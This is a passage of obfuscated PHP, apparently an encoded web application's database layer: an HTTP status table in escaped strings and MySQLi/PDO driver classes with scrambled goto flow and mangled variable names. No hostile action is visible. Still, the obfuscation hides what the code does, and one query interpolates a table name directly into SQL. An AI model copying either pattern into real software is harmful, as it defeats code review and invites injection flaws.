"\125\163\x65\x20\x50\162\x6f\x78\x79", "\x33\x30\x37" => "\124\145\x6d\x70\x6f\162\141\162\x79\x20\122\145\x64\x69\x72\x65\143\x74", "\63\60\70" => "\120\x65\162\x6d\x61\x6e\145\x6e\164\40\122\145\144\151\x72\145\x63\x74", "\64\x30\60" => "\102\x61\144\x20\122\x65\x71\x75\145\x73\164", "\x34\60\x31" => "\125\x6e\x61\165\164\x68\157\x72\x69\x7a\145\x64", "\64\x30\x32" => "\120\141\171\x6d\145\x6e\x74\40\x52\x65\x71\x75\x69\x72\x65\x64", "\64\60\63" => "\x46\x6f\162\142\x69\x64\x64\x65\156", "\64\x30\x34" => "\116\x6f\x74\40\x46\x6f\x75\x6e\x64", "\64\x30\65" => "\x4d\x65\x74\x68\x6f\144\40\x4e\x6f\164\40\x41\154\x6c\157\x77\145\x64", "\x34\60\66" => "\116\157\164\x20\x41\143\x63\x65\160\164\x61\x62\154\145", "\x34\60\67" => "\x50\162\x6f\x78\x79\x20\x41\x75\x74\x68\145\156\164\x69\x63\141\164\151\x6f\x6e\x20\122\x65\x71\x75\x69\x72\145\x64", "\64\60\x38" => "\122\145\161\165\x65\x73\x74\x20\124\x69\155\x65\x6f\165\164", "\x34\x30\71" => "\x43\157\x6e\x66\x6c\x69\x63\x74", "\64\61\60" => "\107\157\x6e\x65", "\x34\x31\x31" => "\114\x65\156\147\x74\x68\x20\122\145\x71\x75\151\x72\145\x64", "\x34\x31\62" => "\120\162\145\x63\157\x6e\144\x69\164\x69\157\156\x20\106\141\x69\x6c\x65\x64", "\64\61\x33" => "\x52\145\161\165\x65\163\x74\x20\105\x6e\x74\x69\164\171\40\124\157\x6f\40\114\x61\162\147\145", "\x34\61\x34" => "\122\x65\161\x75\x65\163\164\40\x55\x52\111\x20\124\157\x6f\x20\114\x61\x72\147\145", "\x34\x31\x35" => "\125\x6e\163\165\x70\x70\x6f\x72\164\145\x64\x20\115\x65\144\151\141\40\124\171\160\x65", "\x34\x31\x36" => "\122\145\161\x75\x65\163\x74\145\144\x20\x52\x61\156\x67\145\40\x4e\157\x74\40\123\141\x74\x69\x73\x66\151\x61\142\x6c\x65", "\64\61\x37" => "\x45\170\160\x65\143\x74\x61\x74\x69\157\x6e\40\x46\141\x69\x6c\x65\x64", "\x34\x32\62" => "\x55\156\160\162\x6f\x63\145\163\x73\141\x62\154\145\40\105\x6e\164\151\164\171", "\64\62\x33" => "\114\157\143\x6b\x65\x64", "\x34\x32\64" => "\106\141\x69\154\145\x64\x20\x44\145\160\x65\x6e\144\x65\x6e\143\171", "\64\x32\65" => "\125\156\157\x72\144\145\162\x65\x64\x20\x43\x6f\154\154\145\x63\164\x69\157\x6e", "\x34\62\66" => "\125\x70\x67\162\141\x64\x65\40\x52\x65\161\165\151\162\145\x64", "\x34\x32\70" => "\120\162\x65\x63\157\x6e\x64\x69\164\x69\157\156\x20\x52\x65\x71\165\151\x72\145\x64", "\x34\x32\x39" => "\x54\157\x6f\x20\x4d\x61\x6e\171\x20\x52\145\161\165\145\x73\164\163", "\x34\x33\61" => "\122\x65\x71\165\x65\x73\x74\x20\110\x65\141\x64\145\162\40\106\x69\x65\x6c\144\163\x20\124\157\x6f\x20\114\141\162\x67\x65", "\64\64\64" => "\116\157\40\122\x65\163\x70\157\x6e\163\x65", "\64\65\60" => "\102\x6c\x6f\143\x6b\145\144\40\142\171\x20\127\151\x6e\x64\x6f\x77\x73\40\x50\141\x72\x65\156\164\x61\x6c\x20\x43\157\x6e\x74\x72\157\154\163", "\64\x35\x31" => "\125\x6e\141\x76\141\x69\x6c\141\142\154\x65\x20\x46\x6f\162\x20\114\145\x67\x61\154\x20\122\145\141\163\x6f\156\163", "\x34\x39\x34" => "\x52\145\x71\165\145\x73\x74\x20\110\145\x61\x64\145\x72\x20\124\x6f\157\x20\114\141\x72\147\x65", "\65\60\x30" => "\x49\156\164\145\162\x6e\141\x6c\40\x53\x65\162\166\145\162\40\x45\162\x72\x6f\x72", "\x35\x30\x31" => "\116\157\x74\x20\111\155\160\154\145\x6d\x65\156\164\145\144", "\65\x30\62" => "\102\141\x64\x20\107\x61\x74\145\x77\141\171", "\65\60\x33" => "\x53\x65\162\x76\151\x63\x65\40\x55\x6e\141\166\x61\151\x6c\141\x62\154\145", "\65\x30\64" => "\x47\x61\164\145\x77\141\171\40\x54\151\155\145\157\165\x74", "\65\x30\65" => "\110\x54\x54\x50\x20\126\x65\x72\x73\x69\157\156\x20\156\157\x74\x20\x73\165\160\x70\x6f\162\164\145\144", "\65\60\67" => "\x49\156\163\165\x66\146\x69\143\151\x65\156\x74\40\123\x74\157\x72\141\x67\145"); public static function code($AÒÙ‰Â¡«) { $CöÙÒôÛ =& $_SERVER[Ö¹ñÒÁ²÷]; $AÒÙ‰Â¡« = $AÒÙ‰Â¡« . $CöÙÒôÛ[33]; $fÀïªÈíÏ = self::$statusCode[$AÒÙ‰Â¡«]; $fÀïªÈíÏ = $fÀïªÈíÏ ? "\110\124\x54\x50\x2f\x31\x2e\x31\x20{$AÒÙ‰Â¡«}\40" . $fÀïªÈíÏ : $CöÙÒôÛ[33]; return $fÀïªÈíÏ; } } goto C¥™Í³¸; F©‹ºÏ¹Ğ¶: class DbMysqli extends Db { public function __construct($EÇ¬¸Èİõí = '') { $e…àôİÃ¡„ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!extension_loaded($e…àôİÃ¡„[724])) { think_exception(think_lang($e…àôİÃ¡„[10]) . $e…àôİÃ¡„[821]); } if (!empty($EÇ¬¸Èİõí)) { $this->config = $EÇ¬¸Èİõí; if (empty($this->config[$e…àôİÃ¡„[13]])) { $this->config[$e…àôİÃ¡„[13]] = $e…àôİÃ¡„[33]; } } } public function connect($bÀ×½¨¶Óì = '', $bò÷²ù½ù» = 0) { $cÚ·¯°™ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->linkID[$bò÷²ù½ù»])) { goto CÅæ«»‡ó; EÈ‹‹®ğŒ‘: $this->connected = !0; if (1 != think_config($cÚ·¯°™[18])) { unset($this->config); } goto FßİøŠÆŞŸ; aÌÍŸœ×†·: $a¹ÈàñØ = $this->linkID[$bò÷²ù½ù»]->server_version; $this->linkID[$bò÷²ù½ù»]->query($cÚ·¯°™[799] . think_config($cÚ·¯°™[800]) . $cÚ·¯°™[55]); if ($a¹ÈàñØ > $cÚ·¯°™[801]) { $this->linkID[$bò÷²ù½ù»]->query($cÚ·¯°™[802]); } goto EÈ‹‹®ğŒ‘; CÅæ«»‡ó: if (empty($bÀ×½¨¶Óì)) { $bÀ×½¨¶Óì = $this->config; } $this->linkID[$bò÷²ù½ù»] = new mysqli($bÀ×½¨¶Óì[$cÚ·¯°™[795]], $bÀ×½¨¶Óì[$cÚ·¯°™[797]], $bÀ×½¨¶Óì[$cÚ·¯°™[798]], $bÀ×½¨¶Óì[$cÚ·¯°™[17]], $bÀ×½¨¶Óì[$cÚ·¯°™[796]] ? intval($bÀ×½¨¶Óì[$cÚ·¯°™[796]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto aÌÍŸœ×†·; FßİøŠÆŞŸ: } return $this->linkID[$bò÷²ù½ù»]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($dåÍÎˆ¥Ä…) { goto C†©Ú’ïŠë; C†©Ú’ïŠë: $Eƒ²…ŞƒÏ° =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÒŸÜ…ÂïÌ; BÒŸÜ…ÂïÌ: $this->queryStr = $dåÍÎˆ¥Ä…; if ($this->queryID) { $this->free(); } think_action_status($Eƒ²…ŞƒÏ°[19], 1); goto bÜƒÓ¦˜Âñ; bÜƒÓ¦˜Âñ: think_status($Eƒ²…ŞƒÏ°[20]); $this->queryID = $this->_linkID->query($dåÍÎˆ¥Ä…); if ($this->_linkID->more_results()) { while (($dÉ†í–·ÚÂ = $this->_linkID->next_result()) != NULL) { $dÉ†í–·ÚÂ->free_result(); } } goto f¨Š¯À™âÄ; f¨Š¯À™âÄ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aÔå¹³ËãÅ; aÔå¹³ËãÅ: } public function execute($CòÚŸ‚Ïó¤) { goto b¼÷áŠ½˜‘; DÉŞÉØ„¿‡: think_status($EÈò£éŸŞ[20]); $CˆƒÏ«‚»© = $this->_linkID->query($CòÚŸ‚Ïó¤); $this->debug(); goto fŞßù”©­Ó; b¼÷áŠ½˜‘: $EÈò£éŸŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¶÷ÁÛâŠ ; E¶÷ÁÛâŠ : $this->queryStr = $CòÚŸ‚Ïó¤; if ($this->queryID) { $this->free(); } think_action_status($EÈò£éŸŞ[21], 1); goto DÉŞÉØ„¿‡; fŞßù”©­Ó: if (!1 === $CˆƒÏ«‚»©) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto d“ÅÈ»…Ñã; d“ÅÈ»…Ñã: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D™ÁºàÆÎª = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$D™ÁºàÆÎª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aàß°Ÿù˜  = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aàß°Ÿù˜ ) { $this->error(); return !1; } } return !0; } private function getAll() { $C¶ùÛºˆ¶è = array(); if ($this->numRows > 0) { for ($Eä”Â‹¸­ = 0; $Eä”Â‹¸­ < $this->numRows; $Eä”Â‹¸­++) { $C¶ùÛºˆ¶è[$Eä”Â‹¸­] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $C¶ùÛºˆ¶è; } public function getFields($CÂË‰ÃÅÌ‚) { $E„©ÛŠœ =& $_SERVER[Ö¹ñÒÁ²÷]; $fĞôÀÔâ ¶ = $this->query($E„©ÛŠœ[806] . $this->parseKey($CÂË‰ÃÅÌ‚)); $aÂà®ÚÍö¼ = array(); if ($fĞôÀÔâ ¶) { foreach ($fĞôÀÔâ ¶ as $Eå’ïó½‹½ => $dÄã¹ããß÷) { $aÂà®ÚÍö¼[$dÄã¹ããß÷[$E„©ÛŠœ[27]]] = array($E„©ÛŠœ[28] => $dÄã¹ããß÷[$E„©ÛŠœ[27]], $E„©ÛŠœ[29] => $dÄã¹ããß÷[$E„©ÛŠœ[30]], $E„©ÛŠœ[31] => (bool) ($dÄã¹ããß÷[$E„©ÛŠœ[32]] === $E„©ÛŠœ[33]), $E„©ÛŠœ[34] => $dÄã¹ããß÷[$E„©ÛŠœ[35]], $E„©ÛŠœ[36] => strtolower($dÄã¹ããß÷[$E„©ÛŠœ[37]]) == $E„©ÛŠœ[38], $E„©ÛŠœ[39] => strtolower($dÄã¹ããß÷[$E„©ÛŠœ[40]]) == $E„©ÛŠœ[41]); } } return $aÂà®ÚÍö¼; } public function getTables($døÕ¨İ¾‘Ú = '') { $dÒùÇš«Î· =& $_SERVER[Ö¹ñÒÁ²÷]; $a–¿³„Ù£Ä = !empty($døÕ¨İ¾‘Ú) ? $dÒùÇš«Î·[808] . $døÕ¨İ¾‘Ú : $dÒùÇš«Î·[809]; $Dçˆ­Ü‡õš = $this->query($a–¿³„Ù£Ä); $C¹é—•Ù¢ = array(); if ($Dçˆ­Ü‡õš) { foreach ($Dçˆ­Ü‡õš as $CÒÂäó¿½ => $D „ĞÇ·î) { $C¹é—•Ù¢[$CÒÂäó¿½] = current($D „ĞÇ·î); } } return $C¹é—•Ù¢; } public function replace($f¶İêÈ„ù, $dïé½¶ëÓó = array()) { $aæ­è´› =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($f¶İêÈ„ù as $A‹¡ÛÖæ => $F¡×‚êß‚á) { $döòö†…» = $this->parseValue($F¡×‚êß‚á); if (is_scalar($döòö†…»)) { $eîÈ¢„êËÔ[] = $döòö†…»; $C‰¶»Ûõ¨¬[] = $this->parseKey($A‹¡ÛÖæ); } } $FÉ£‡Â¬šÙ = $aæ­è´›[810] . $this->parseTable($dïé½¶ëÓó[$aæ­è´›[263]]) . $aæ­è´›[811] . implode($aæ­è´›[47], $C‰¶»Ûõ¨¬) . $aæ­è´›[812] . implode($aæ­è´›[47], $eîÈ¢„êËÔ) . $aæ­è´›[813]; return $this->execute($FÉ£‡Â¬šÙ); } public function insertAll($b†ˆ¹éùÆ‰, $D¼óŸË²£‡ = array(), $Aá…ã¨Ş¾ = false) { goto FŠùñŒŸáÌ; c‡êĞ¹ğù: $cÙõò÷ŒêŠ = array(); foreach ($b†ˆ¹éùÆ‰ as $c‘ö§‰æ¯ˆ) { $eØ‰ëÊåÂ = array(); foreach ($c‘ö§‰æ¯ˆ as $d˜¤ÇÓéí‹ => $aŸ„‹Ş¯²è) { $aŸ„‹Ş¯²è = $this->parseValue($aŸ„‹Ş¯²è); if (is_scalar($aŸ„‹Ş¯²è)) { $eØ‰ëÊåÂ[] = $aŸ„‹Ş¯²è; } } $cÙõò÷ŒêŠ[] = $BÈˆ Ï†µ¸[244] . implode($BÈˆ Ï†µ¸[47], $eØ‰ëÊåÂ) . $BÈˆ Ï†µ¸[813]; } array_walk($aŠØŞâùÊÛ, array($this, $BÈˆ Ï†µ¸[814])); goto dÓ²ÉğÖÇ; dÓ²ÉğÖÇ: $e§”ÊÆîİÏ = ($Aá…ã¨Ş¾ ? $BÈˆ Ï†µ¸[815] : $BÈˆ Ï†µ¸[816]) . $BÈˆ Ï†µ¸[817] . $this->parseTable($D¼óŸË²£‡[$BÈˆ Ï†µ¸[263]]) . $BÈˆ Ï†µ¸[811] . implode($BÈˆ Ï†µ¸[47], $aŠØŞâùÊÛ) . $BÈˆ Ï†µ¸[818] . implode($BÈˆ Ï†µ¸[47], $cÙõò÷ŒêŠ); return $this->execute($e§”ÊÆîİÏ); goto f ¡Ò‘˜Ã¢; FŠùñŒŸáÌ: $BÈˆ Ï†µ¸ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!is_array($b†ˆ¹éùÆ‰[0])) { return !1; } $aŠØŞâùÊÛ = array_keys($b†ˆ¹éùÆ‰[0]); goto c‡êĞ¹ğù; f ¡Ò‘˜Ã¢: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $BÌø¿¼œç =& $_SERVER[Ö¹ñÒÁ²÷]; $this->error = $this->_linkID->errno . $BÌø¿¼œç[4] . $this->_linkID->error; if ($BÌø¿¼œç[33] != $this->queryStr) { $this->error .= LNG($BÌø¿¼œç[45]) . $this->queryStr; } think_trace($this->error, $BÌø¿¼œç[33], $BÌø¿¼œç[46]); return $this->error; } public function escapeString($b•’ËØç«´) { if ($this->_linkID) { return $this->_linkID->real_escape_string($b•’ËØç«´); } else { return addslashes($b•’ËØç«´); } } public function parseKey(&$A¿Ñß¥¯Õ, $E¾„†µÙá¬ = true) { $dÍÍÎ½¹¤ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($E¾„†µÙá¬) { $A¿Ñß¥¯Õ = $this->parseKeyCheck($A¿Ñß¥¯Õ); } if ($A¿Ñß¥¯Õ != $dÍÍÎ½¹¤[172] && !preg_match($dÍÍÎ½¹¤[819], $A¿Ñß¥¯Õ)) { $A¿Ñß¥¯Õ = $dÍÍÎ½¹¤[820] . trim($A¿Ñß¥¯Õ, $dÍÍÎ½¹¤[820]) . $dÍÍÎ½¹¤[820]; } return $A¿Ñß¥¯Õ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($fò‘º¸¯Ã§ = '') { $A¼Äß´ƒ†… =& $_SERVER[Ö¹ñÒÁ²÷]; if (!class_exists($A¼Äß´ƒ†…[822])) { think_exception(think_lang($A¼Äß´ƒ†…[10]) . $A¼Äß´ƒ†…[823]); } if (!empty($fò‘º¸¯Ã§)) { $this->config = $fò‘º¸¯Ã§; if (empty($this->config[$A¼Äß´ƒ†…[13]])) { $this->config[$A¼Äß´ƒ†…[13]] = array(); } } } public function connect($c¢¢Ó­˜×¤ = '', $Aº»®ä—‹ß = 0) { $e¼×‚½ô¡ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->linkID[$Aº»®ä—‹ß])) { goto Dùåç–©ê; Dùåç–©ê: if (empty($c¢¢Ó­˜×¤)) { $c¢¢Ó­˜×¤ = $this->config; } if ($this->pconnect) { $c¢¢Ó­˜×¤[$e¼×‚½ô¡[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Aº»®ä—‹ß] = new PDO($c¢¢Ó­˜×¤[$e¼×‚½ô¡[824]], $c¢¢Ó­˜×¤[$e¼×‚½ô¡[797]], $c¢¢Ó­˜×¤[$e¼×‚½ô¡[798]], $c¢¢Ó­˜×¤[$e¼×‚½ô¡[13]]); } catch (PDOException $AÔäË°•³) { think_exception($AÔäË°•³->getMessage()); } goto aÑÏĞÊöÌÁ; aÑÏĞÊöÌÁ: $this->dbType = $this->_getDsnType($c¢¢Ó­˜×¤[$e¼×‚½ô¡[824]]); if (in_array($this->dbType, array($e¼×‚½ô¡[825], $e¼×‚½ô¡[826], $e¼×‚½ô¡[827], $e¼×‚½ô¡[828]))) { think_exception($e¼×‚½ô¡[829] . $this->dbType . $e¼×‚½ô¡[830] . $this->dbType . $e¼×‚½ô¡[831]); } if (!$this->linkID[$Aº»®ä—‹ß]) { think_exception($e¼×‚½ô¡[832]); } goto AÆ¿ÛÜŠÊ; AÆ¿ÛÜŠÊ: $this->linkID[$Aº»®ä—‹ß]->exec($e¼×‚½ô¡[833] . think_config($e¼×‚½ô¡[800])); $this->connected = !0; if (1 != think_config($e¼×‚½ô¡[18])) { unset($this->config); } goto Aºğ‡³«¸; Aºğ‡³«¸: } return $this->linkID[$Aº»®ä—‹ß]; } public function free() { $this->PDOStatement = null; } public function query($d‹÷¥¢§»“, $F‘¤÷—›æ = array()) { goto dÂ¦×»×ÚÖ; f¶·‚ïÃŞ¶: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $eÁƒâğãÈŒ = $this->PDOStatement->execute($F‘¤÷—›æ); $this->debug(); goto FÊš‰ÛçÖÌ; FÊš‰ÛçÖÌ: if (!1 === $eÁƒâğãÈŒ) { $this->error(); return !1; } else { return $this->getAll(); } goto B¾‹–£åÊ©; E¡˜Â´…Æº: $this->queryStr = $d‹÷¥¢§»“; if (!empty($F‘¤÷—›æ)) { $this->queryStr .= $Cìç¬†Îì¸[834] . print_r($F‘¤÷—›æ, !0) . $Cìç¬†Îì¸[835]; } if (!empty($this->PDOStatement)) { $this->free(); } goto B‡‰•Ëåº°; B‡‰•Ëåº°: think_action_status($Cìç¬†Îì¸[19], 1); think_status($Cìç¬†Îì¸[20]); $this->PDOStatement = $this->_linkID->prepare($d‹÷¥¢§»“); goto f¶·‚ïÃŞ¶; dÂ¦×»×ÚÖ: $Cìç¬†Îì¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¡˜Â´…Æº; B¾‹–£åÊ©: } public function execute($E÷Å…½²é™, $BÉ•‘‡İËù = array()) { goto C¯ÅêàøÌ¸; C¯ÅêàøÌ¸: $d²İ”‹¥ªÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f”Û¡Š°ìì; f”Û¡Š°ìì: $this->queryStr = $E÷Å…½²é™; if (!empty($BÉ•‘‡İËù)) { $this->queryStr .= $d²İ”‹¥ªÄ[834] . print_r($BÉ•‘‡İËù, !0) . $d²İ”‹¥ªÄ[835]; } $Bº£§Ô‰¡ä = !1; goto dÊÏØ‰éÌ¢; dºï×÷ö­: $dĞˆÂœà’ = $this->PDOStatement->execute($BÉ•‘‡İËù); $this->debug(); if (!1 === $dĞˆÂœà’) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Bº£§Ô‰¡ä || preg_match($d²İ”‹¥ªÄ[840], $E÷Å…½²é™)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto a‘êšßÅ„á; dÊÏØ‰éÌ¢: if ($this->dbType == $d²İ”‹¥ªÄ[828]) { if (preg_match($d²İ”‹¥ªÄ[836], $this->queryStr, $fÃÌì¹´«×)) { $this->table = think_config($d²İ”‹¥ªÄ[837]) . str_ireplace(think_config($d²İ”‹¥ªÄ[838]), $d²İ”‹¥ªÄ[357], $fÃÌì¹´«×[2]); $Bº£§Ô‰¡ä = (bool) $this->query($d²İ”‹¥ªÄ[839] . strtoupper($this->table) . $d²İ”‹¥ªÄ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($d²İ”‹¥ªÄ[21], 1); goto b®ˆ‚‡÷ç; b®ˆ‚‡÷ç: think_status($d²İ”‹¥ªÄ[20]); $this->PDOStatement = $this->_linkID->prepare($E÷Å…½²é™); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto dºï×÷ö­; a‘êšßÅ„á: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÜµï¶™£Û = $this->_linkID->commit(); $this->transTimes = 0; if (!$BÜµï¶™£Û) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $AÄç†£³á¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$AÄç†£³á¤) { $this->error(); return !1; } } return !0; } private function getAll() { $eë’…Õ®¹» = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($eë’…Õ®¹»); return $eë’…Õ®¹»; } public function getFields($eŞÓœ´İ¬) { goto c‡“ÕÆ÷Ò°; b®»•ˆ‘·: $b»Œ‹ë’ÚŸ = $this->query($d†»‡±ø); $CÉ¬œ¯¥Ç¦ = array(); if ($b»Œ‹ë’ÚŸ) { foreach ($b»Œ‹ë’ÚŸ as $eÆìŠ†ñ… => $b‰ŠÊ‘“™) { $b‰ŠÊ‘“™ = array_change_key_case($b‰ŠÊ‘“™); $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[28]] = isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[28]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[28]] : $CÑ¸›·Ïòï[357]; $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[29]] = isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[29]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[29]] : $CÑ¸›·Ïòï[357]; $f±È¶¯ÜßĞ = isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[257]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[257]] : $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[28]]; $CÉ¬œ¯¥Ç¦[$f±È¶¯ÜßĞ] = array($CÑ¸›·Ïòï[28] => $f±È¶¯ÜßĞ, $CÑ¸›·Ïòï[29] => $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[29]], $CÑ¸›·Ïòï[31] => (bool) (isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[99]]) && $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[99]] === $CÑ¸›·Ïòï[33] || isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[31]]) && $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[31]] === $CÑ¸›·Ïòï[33]), $CÑ¸›·Ïòï[34] => isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[34]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[34]] : (isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[53]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[53]] : $CÑ¸›·Ïòï[357]), $CÑ¸›·Ïòï[36] => isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[89]]) ? strtolower($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[89]]) == $CÑ¸›·Ïòï[38] : (isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[54]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[54]] : !1), $CÑ¸›·Ïòï[39] => isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[857]]) ? strtolower($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[857]]) == $CÑ¸›·Ïòï[41] : (isset($b‰ŠÊ‘“™[$CÑ¸›·Ïòï[89]]) ? $b‰ŠÊ‘“™[$CÑ¸›·Ïòï[89]] : !1)); } } goto bÆÄÌ‡ÑÏ; c‡“ÕÆ÷Ò°: $CÑ¸›·Ïòï =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!0); if (think_config($CÑ¸›·Ïòï[841])) { $d†»‡±ø = str_replace($CÑ¸›·Ïòï[842], $eŞÓœ´İ¬, think_config($CÑ¸›·Ïòï[841])); } else { switch ($this->dbType) { case $CÑ¸›·Ïòï[825]: case $CÑ¸›·Ïòï[843]: $d†»‡±ø = "\x53\105\x4c\x45\x43\124\x20\x20\40\x63\157\154\x75\x6d\156\x5f\156\141\x6d\x65\40\141\163\x20\47\116\141\x6d\x65\x27\54\x20\40\x20\x64\x61\x74\x61\x5f\x74\171\x70\145\x20\141\x73\40\47\x54\x79\160\x65\x27\x2c\x20\40\x20\143\x6f\x6c\x75\x6d\156\x5f\144\x65\146\141\x75\154\x74\x20\141\x73\x20\x27\104\x65\x66\x61\x75\154\164\x27\54\x20\x20\40\151\x73\137\156\165\154\x6c\141\x62\x6c\145\40\141\163\40\x27\116\x75\154\154\x27\12\x9\11\106\122\117\x4d\11\x69\156\x66\x6f\x72\x6d\x61\164\151\x6f\156\x5f\163\143\x68\x65\155\x61\56\x74\x61\x62\x6c\145\163\40\x41\x53\40\164\12\x9\x9\x4a\117\111\x4e\11\x69\x6e\x66\x6f\162\155\141\x74\151\157\156\x5f\163\143\150\x65\155\x61\56\143\157\x6c\165\155\156\x73\x20\x41\123\x20\x63\12\11\11\x4f\x4e\40\x20\x74\56\x74\x61\x62\154\x65\x5f\143\141\x74\x61\154\x6f\147\x20\75\40\143\56\x74\141\x62\154\145\x5f\143\x61\x74\141\x6c\157\x67\xa\11\x9\x41\x4e\104\40\x74\56\x74\x61\142\154\x65\137\x73\x63\x68\145\x6d\141\x20\x3d\40\143\x2e\x74\141\142\x6c\145\137\163\143\150\x65\x6d\x61\xa\11\x9\101\x4e\x44\40\x74\x2e\164\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\40\75\x20\x63\x2e\x74\141\142\x6c\145\137\156\141\x6d\x65\xa\11\11\x57\x48\105\122\x45\x20\x20\x20\164\x2e\x74\141\x62\x6c\x65\137\156\x61\x6d\x65\40\75\x20\x27{$eŞÓœ´İ¬}\x27"; break; case $CÑ¸›·Ïòï[844]: $d†»‡±ø = $CÑ¸›·Ïòï[845] . $eŞÓœ´İ¬ . $CÑ¸›·Ïòï[846]; break; case $CÑ¸›·Ïòï[826]: case $CÑ¸›·Ïòï[828]: $d†»‡±ø = $CÑ¸›·Ïòï[847] . $CÑ¸›·Ïòï[848] . $CÑ¸›·Ïòï[849] . strtoupper($eŞÓœ´İ¬) . $CÑ¸›·Ïòï[850] . strtoupper($eŞÓœ´İ¬) . $CÑ¸›·Ïòï[851]; break; case $CÑ¸›·Ïòï[852]: $d†»‡±ø = $CÑ¸›·Ïòï[853] . $eŞÓœ´İ¬ . $CÑ¸›·Ïòï[854]; break; case $CÑ¸›·Ïòï[827]: break; case $CÑ¸›·Ïòï[855]: default: $d†»‡±ø = $CÑ¸›·Ïòï[856] . ($this->dbType == $CÑ¸›·Ïòï[855] ? "\140{$eŞÓœ´İ¬}\140" : $eŞÓœ´İ¬); } } goto b®»•ˆ‘·; bÆÄÌ‡ÑÏ: return $CÉ¬œ¯¥Ç¦; goto c¾²â”›Ş„; c¾²â”›Ş„: } public function getTables($F ‚­ø ÷Ù = '') { $A·«½æÎÍÅ =& $_SERVER[Ö¹ñÒÁ²÷]; if (think_config($A·«½æÎÍÅ[858])) { $eˆƒòÆº‚ = str_replace($A·«½æÎÍÅ[859], $F ‚­ø ÷Ù, think_config($A·«½æÎÍÅ[858])); } else { switch ($this->dbType) { case $A·«½æÎÍÅ[826]: case $A·«½æÎÍÅ[828]: $eˆƒòÆº‚ = $A·«½æÎÍÅ[860]; break; case $A·«½æÎÍÅ[825]: case $A·«½æÎÍÅ[843]: $eˆƒòÆº‚ = $A·«½æÎÍÅ[861]; break; case $A·«½æÎÍÅ[852]: $eˆƒòÆº‚ = $A·«½æÎÍÅ[862]; break; case $A·«½æÎÍÅ[827]: think_exception(think_lang($A·«½æÎÍÅ[863]) . $A·«½æÎÍÅ[864]); break; case $A·«½æÎÍÅ[844]: $eˆƒòÆº‚ = $A·«½æÎÍÅ[42] . $A·«½æÎÍÅ[43] . $A·«½æÎÍÅ[44]; break; case $A·«½æÎÍÅ[855]: default: if (!empty($F ‚­ø ÷Ù)) { $eˆƒòÆº‚ = $A·«½æÎÍÅ[808] . $F ‚­ø ÷Ù; } else { $eˆƒòÆº‚ = $A·«½æÎÍÅ[809]; } } } $fŠƒÙÆ¼Œ = $this->query($eˆƒòÆº‚); $FË ßš¯Ø = array(); foreach ($fŠƒÙÆ¼Œ as $D‹ÓÆ…‡¬À => $fàÁ±êæª) { $FË 